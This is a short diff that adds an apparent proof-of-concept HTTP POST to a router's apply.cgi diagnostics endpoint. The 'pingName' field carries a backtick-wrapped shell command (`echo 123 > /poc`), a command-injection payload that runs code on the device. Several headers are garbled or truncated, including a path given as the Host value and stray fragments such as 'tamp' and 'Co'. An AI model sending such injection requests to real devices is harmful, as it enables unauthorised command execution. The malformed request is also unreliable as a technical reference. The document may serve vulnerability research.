@@ -1,0 +1,8 @@
+GET /apply.cgi?c HTTP/1.1
+Host: /cgi-bin/
+tamp
+Accept: 69
+Co
+Content-Length: 650
+
+pingName=`echo 123 > /poc`&diag_type=1&det_multiplexing=123&submit_flag=diag
